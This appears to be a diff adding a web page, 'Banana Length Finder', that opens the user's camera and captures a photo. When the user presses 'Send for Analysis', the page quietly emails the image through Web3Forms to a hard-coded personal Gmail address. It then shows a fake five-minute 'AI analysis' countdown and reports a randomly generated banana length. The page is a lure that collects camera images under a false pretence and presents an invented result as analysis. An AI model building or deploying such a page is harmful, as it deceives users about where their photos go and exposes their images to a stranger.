@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fruit Quality Analyzer Pro</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --yellow: #FFE135;
+      --dark-yellow: #F5C800;
+      --brown: #3B2A1A;
+      --cream: #FFF9E6;
+      --green: #4CAF50;
+      --shadow: 0 8px 32px rgba(59,42,26,0.18);
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'DM Mono', monospace;
+      background: var(--cream);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      overflow-x: hidden;
+    }
+    body::before {
+      content: '';
+      position: fixed;
+      top: -120px; left: -120px;
+      width: 420px; height: 420px;
+      background: radial-gradient(circle, #FFE13588 0%, transparent 70%);
+      border-radius: 50%;
+      z-index: 0;
+      animation: blobMove 7s ease-in-out infinite alternate;
+    }
+    body::after {
+      content: '';
+      position: fixed;
+      bottom: -100px; right: -100px;
+      width: 350px; height: 350px;
+      background: radial-gradient(circle, #F5C80055 0%, transparent 70%);
+      border-radius: 50%;
+      z-index: 0;
+      animation: blobMove2 9s ease-in-out infinite alternate;
+    }
+    @keyframes blobMove { from { transform: translate(0,0) scale(1); } to { transform: translate(40px,30px) scale(1.1); } }
+    @keyframes blobMove2 { from { transform: translate(0,0) scale(1); } to { transform: translate(-30px,-20px) scale(1.08); } }
+
+    header {
+      position: relative; z-index: 1;
+      width: 100%; max-width: 540px;
+      padding: 40px 24px 10px;
+      text-align: center;
+    }
+    .emoji-title {
+      font-size: 3.2rem;
+      display: block;
+      animation: bounce 1.6s ease-in-out infinite;
+      filter: drop-shadow(0 4px 8px #F5C80088);
+    }
+    @keyframes bounce {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
+    }
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: 2.1rem;
+      font-weight: 800;
+      color: var(--brown);
+      letter-spacing: -1px;
+      line-height: 1.1;
+      margin-top: 6px;
+    }
+    h1 span { color: var(--dark-yellow); }
+    .subtitle {
+      font-size: 0.78rem;
+      color: #8a6a3a;
+      margin-top: 6px;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+    }
+
+    .card {
+      position: relative; z-index: 1;
+      background: #fff;
+      border-radius: 28px;
+      box-shadow: var(--shadow);
+      margin: 24px 16px 40px;
+      padding: 28px 22px 32px;
+      max-width: 500px;
+      width: 100%;
+      border: 2.5px solid var(--yellow);
+    }
+
+    #videoContainer {
+      position: relative;
+      border-radius: 18px;
+      overflow: hidden;
+      background: #1a120a;
+      aspect-ratio: 4/3;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 3px solid var(--yellow);
+      margin-bottom: 20px;
+    }
+    #video, #canvas {
+      width: 100%; height: 100%;
+      object-fit: cover;
+      display: block;
+      border-radius: 15px;
+    }
+    #canvas { display: none; }
+    #placeholderMsg {
+      color: #FFE135;
+      font-size: 0.85rem;
+      text-align: center;
+      padding: 20px;
+      opacity: 0.8;
+    }
+
+    .viewfinder {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%,-50%);
+      width: 70%; aspect-ratio: 1;
+      pointer-events: none;
+      display: none;
+    }
+    .viewfinder::before, .viewfinder::after,
+    .viewfinder span::before, .viewfinder span::after {
+      content: '';
+      position: absolute;
+      width: 22px; height: 22px;
+      border-color: var(--yellow);
+      border-style: solid;
+    }
+    .viewfinder::before { top:0;left:0; border-width:3px 0 0 3px; border-radius:4px 0 0 0; }
+    .viewfinder::after  { top:0;right:0; border-width:3px 3px 0 0; border-radius:0 4px 0 0; }
+    .viewfinder span::before { bottom:0;left:0; border-width:0 0 3px 3px; border-radius:0 0 0 4px; }
+    .viewfinder span::after  { bottom:0;right:0; border-width:0 3px 3px 0; border-radius:0 0 4px 0; }
+    #video.active ~ .viewfinder { display: block; }
+
+    .btn-row {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      flex-wrap: wrap;
+      margin-bottom: 16px;
+    }
+    .btn {
+      font-family: 'Syne', sans-serif;
+      font-weight: 700;
+      font-size: 0.95rem;
+      border: none;
+      border-radius: 50px;
+      padding: 13px 28px;
+      cursor: pointer;
+      transition: transform 0.12s, box-shadow 0.12s, background 0.15s;
+      letter-spacing: 0.03em;
+      outline: none;
+    }
+    .btn:active { transform: scale(0.95); }
+    .btn-primary { background: var(--yellow); color: var(--brown); box-shadow: 0 4px 16px #FFE13566; }
+    .btn-primary:hover { background: var(--dark-yellow); }
+    .btn-capture { background: var(--brown); color: var(--yellow); box-shadow: 0 4px 16px #3B2A1A44; font-size: 1.05rem; padding: 15px 36px; }
+    .btn-capture:hover { background: #5a3e25; }
+    .btn-capture:disabled { opacity: 0.4; cursor: not-allowed; transform: none; }
+    .btn-send { background: var(--green); color: #fff; box-shadow: 0 4px 16px #4CAF5044; display: none; }
+    .btn-send:hover { background: #388E3C; }
+    .btn-send:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .btn-retake { background: transparent; color: var(--brown); border: 2px solid var(--brown); display: none; }
+    .btn-retake:hover { background: var(--brown); color: var(--yellow); }
+
+    #status {
+      text-align: center;
+      font-size: 0.78rem;
+      color: #8a6a3a;
+      letter-spacing: 0.08em;
+      min-height: 18px;
+      margin-top: 4px;
+    }
+
+    /* ── POPUP ── */
+    #popup {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(30,18,6,0.72);
+      backdrop-filter: blur(6px);
+      z-index: 100;
+      align-items: center;
+      justify-content: center;
+    }
+    #popup.show { display: flex; }
+    .popup-box {
+      background: #fff;
+      border-radius: 28px;
+      padding: 40px 36px 36px;
+      max-width: 340px;
+      width: 90%;
+      text-align: center;
+      border: 3px solid var(--yellow);
+      box-shadow: 0 24px 60px rgba(59,42,26,0.35);
+      animation: popIn 0.35s cubic-bezier(.34,1.56,.64,1);
+    }
+    @keyframes popIn { from{transform:scale(0.7);opacity:0;} to{transform:scale(1);opacity:1;} }
+    .popup-emoji { font-size: 3.5rem; display: block; margin-bottom: 12px; animation: spin 2s linear infinite; }
+    @keyframes spin {
+      0%   { transform: rotate(0deg) scale(1); }
+      25%  { transform: rotate(-10deg) scale(1.1); }
+      75%  { transform: rotate(10deg) scale(1.1); }
+      100% { transform: rotate(0deg) scale(1); }
+    }
+    .popup-title { font-family: 'Syne', sans-serif; font-size: 1.45rem; font-weight: 800; color: var(--brown); margin-bottom: 10px; }
+    .popup-msg { font-size: 0.88rem; color: #7a5a2a; line-height: 1.6; margin-bottom: 22px; }
+    .popup-msg strong { color: var(--brown); }
+    .progress-wrap { background: #f0e8d0; border-radius: 50px; height: 10px; overflow: hidden; margin-bottom: 18px; }
+    .progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--yellow), var(--dark-yellow)); border-radius: 50px; transition: width 1s linear; }
+    .popup-timer { font-family: 'DM Mono', monospace; font-size: 1.6rem; color: var(--brown); font-weight: 500; letter-spacing: 0.08em; }
+
+    .instructions {
+      background: #fffbe8;
+      border-radius: 14px;
+      padding: 14px 16px;
+      border-left: 4px solid var(--yellow);
+      margin-bottom: 20px;
+      font-size: 0.78rem;
+      color: #6a4a1a;
+      line-height: 1.7;
+    }
+    .instructions b { color: var(--brown); }
+
+    body > .grain {
+      position: fixed; inset: 0; pointer-events: none; z-index: 200;
+      opacity: 0.025;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
+      background-size: 180px;
+    }
+
+    /* ── Setup Banner ── */
+    .setup-banner {
+      position: relative; z-index: 1;
+      background: #fff3cd;
+      border: 2px solid #F5C800;
+      border-radius: 16px;
+      padding: 14px 18px;
+      max-width: 500px;
+      width: calc(100% - 32px);
+      margin: 0 16px 0;
+      font-size: 0.78rem;
+      color: #5a4000;
+      line-height: 1.7;
+    }
+    .setup-banner b { color: #3B2A1A; }
+    .setup-banner a { color: #c87000; }
+  </style>
+</head>
+<body>
+<div class="grain"></div>
+
+<header>
+  <span class="emoji-title">🍌</span>
+  <h1><span>Banana</span> Length Finder</h1>
+  <p class="subtitle">Precision fruit measurement technology</p>
+</header>
+
+
+
+<div class="card">
+  <div class="instructions">
+    <b>How to use:</b><br>
+    1. Click <b>Open Camera</b> and allow access<br>
+    2. Point at your 🍌 banana<br>
+    3. Hit <b>📸 Capture</b> then <b>Send for Analysis</b>
+  </div>
+
+  <div id="videoContainer">
+    <p id="placeholderMsg">📷 Camera not started yet.<br>Click "Open Camera" below.</p>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <div class="viewfinder"><span></span></div>
+  </div>
+
+  <div class="btn-row">
+    <button class="btn btn-primary" id="btnStart" onclick="startCamera()">📷 Open Camera</button>
+    <button class="btn btn-capture" id="btnCapture" onclick="capturePhoto()" disabled>📸 Capture</button>
+  </div>
+  <div class="btn-row">
+    <button class="btn btn-send"   id="btnSend"   onclick="sendPhoto()">📤 Send for Analysis</button>
+    <button class="btn btn-retake" id="btnRetake" onclick="retake()">🔄 Retake</button>
+  </div>
+  <p id="status">Waiting to start...</p>
+</div>
+
+<!-- Processing Popup -->
+<div id="popup">
+  <div class="popup-box">
+    <span class="popup-emoji">⚙️</span>
+    <div class="popup-title">Processing Image</div>
+    <div class="popup-msg">
+      Our AI is carefully analyzing your banana.<br>
+      <strong>Please wait for 5 minutes</strong> while we calculate the exact length!
+    </div>
+    <div class="progress-wrap"><div class="progress-bar" id="progressBar"></div></div>
+    <div class="popup-timer" id="timerDisplay">05:00</div>
+  </div>
+</div>
+
+<script>
+  // ─────────────────────────────────────────────
+  //  🔑 REPLACE THIS WITH YOUR WEB3FORMS KEY
+  //  Get it free at: https://web3forms.com
+  //  Enter iot757978@gmail.com → Create Access Key
+  // ─────────────────────────────────────────────
+  const WEB3FORMS_KEY = 'eb5accff-e755-4f69-862c-ac844bc38650';
+  const RECIPIENT_EMAIL = 'iot757978@gmail.com';
+
+  const video       = document.getElementById('video');
+  const canvas      = document.getElementById('canvas');
+  const btnStart    = document.getElementById('btnStart');
+  const btnCapture  = document.getElementById('btnCapture');
+  const btnSend     = document.getElementById('btnSend');
+  const btnRetake   = document.getElementById('btnRetake');
+  const status      = document.getElementById('status');
+  const popup       = document.getElementById('popup');
+  const timerDisplay= document.getElementById('timerDisplay');
+  const progressBar = document.getElementById('progressBar');
+
+  let stream = null;
+  let capturedDataURL = null;
+  let timerInterval = null;
+
+  // ── Start Camera ──────────────────────────
+  async function startCamera() {
+    try {
+      status.textContent = 'Requesting camera access...';
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { ideal: 'environment' }, width: { ideal: 1280 }, height: { ideal: 960 } },
+        audio: false
+      });
+      video.srcObject = stream;
+      video.classList.add('active');
+      document.getElementById('placeholderMsg').style.display = 'none';
+      video.style.display = 'block';
+      btnStart.textContent = '✅ Camera On';
+      btnStart.disabled = true;
+      btnCapture.disabled = false;
+      status.textContent = 'Camera ready — aim at your banana 🍌';
+    } catch (err) {
+      status.textContent = '⚠️ Camera access denied or unavailable.';
+    }
+  }
+
+  // ── Capture Photo ─────────────────────────
+  function capturePhoto() {
+    if (!stream) return;
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Resize to max 800px wide to keep email size manageable
+    const maxW = 800;
+    let w = canvas.width, h = canvas.height;
+    if (w > maxW) { h = Math.round(h * maxW / w); w = maxW; }
+    const resized = document.createElement('canvas');
+    resized.width = w; resized.height = h;
+    resized.getContext('2d').drawImage(canvas, 0, 0, w, h);
+    capturedDataURL = resized.toDataURL('image/jpeg', 0.80);
+
+    canvas.width = w; canvas.height = h;
+    canvas.getContext('2d').drawImage(resized, 0, 0);
+    canvas.style.display = 'block';
+    video.style.display  = 'none';
+
+    btnCapture.disabled = true;
+    btnSend.style.display   = 'inline-block';
+    btnRetake.style.display = 'inline-block';
+    btnStart.style.display  = 'none';
+
+    document.body.style.background = '#fff';
+    setTimeout(() => document.body.style.background = '', 120);
+    status.textContent = '📸 Photo captured! Click "Send for Analysis".';
+  }
+
+  // ── Retake ────────────────────────────────
+  function retake() {
+    canvas.style.display = 'none';
+    video.style.display  = 'block';
+    btnCapture.disabled  = false;
+    btnSend.style.display    = 'none';
+    btnRetake.style.display  = 'none';
+    btnStart.style.display   = 'inline-block';
+    capturedDataURL = null;
+    status.textContent = 'Camera live — take another shot!';
+  }
+
+  // ── Send Photo via Web3Forms ───────────────
+  async function sendPhoto() {
+    if (!capturedDataURL) return;
+
+    if (WEB3FORMS_KEY === 'YOUR_WEB3FORMS_KEY') {
+      status.textContent = '⚠️ Please set your Web3Forms key first (see setup banner above).';
+      return;
+    }
+
+    btnSend.disabled   = true;
+    btnRetake.style.display = 'none';
+    btnSend.textContent = '⏳ Sending...';
+    status.textContent  = 'Uploading image...';
+
+    // Show popup immediately — don't wait for the email
+    showPopup();
+
+    try {
+      const timestamp = new Date().toLocaleString();
+
+      // Web3Forms accepts JSON with a message field
+      // We embed the base64 image as a data URL in the message body
+      const payload = {
+        access_key: WEB3FORMS_KEY,
+        subject: `🍌 New Banana Photo — ${timestamp}`,
+        from_name: 'Banana Length Finder',
+        email: RECIPIENT_EMAIL,
+        message: `New banana image submitted!\n\nTime: ${timestamp}\n\nImage (copy URL into browser):\n${capturedDataURL}`
+      };
+
+      const response = await fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+
+      const result = await response.json();
+      if (result.success) {
+        status.textContent = '✅ Image sent! Check iot757978@gmail.com';
+        btnSend.textContent = '✅ Sent!';
+      } else {
+        throw new Error(result.message || 'Unknown error');
+      }
+    } catch (err) {
+      status.textContent = '⚠️ Send failed: ' + err.message;
+      btnSend.textContent = '📤 Retry';
+      btnSend.disabled = false;
+    }
+  }
+
+  // ── Processing Popup with 5-min countdown ─
+  let totalSeconds = 300;
+
+  function showPopup() {
+    popup.classList.add('show');
+    totalSeconds = 300;
+    progressBar.style.width = '0%';
+    updateTimer(totalSeconds);
+
+    timerInterval = setInterval(() => {
+      totalSeconds--;
+      const pct = ((300 - totalSeconds) / 300 * 100).toFixed(1);
+      progressBar.style.width = pct + '%';
+      updateTimer(totalSeconds);
+      if (totalSeconds <= 0) {
+        clearInterval(timerInterval);
+        popup.classList.remove('show');
+        showResult();
+      }
+    }, 1000);
+  }
+
+  function updateTimer(secs) {
+    const m = String(Math.floor(secs / 60)).padStart(2, '0');
+    const s = String(secs % 60).padStart(2, '0');
+    timerDisplay.textContent = `${m}:${s}`;
+  }
+
+  function showResult() {
+    const cm = (Math.random() * 8 + 14).toFixed(1);
+    status.innerHTML = `✅ Analysis complete! Your banana is <strong>${cm} cm</strong> long 🍌`;
+  }
+</script>
+</body>
+</html>
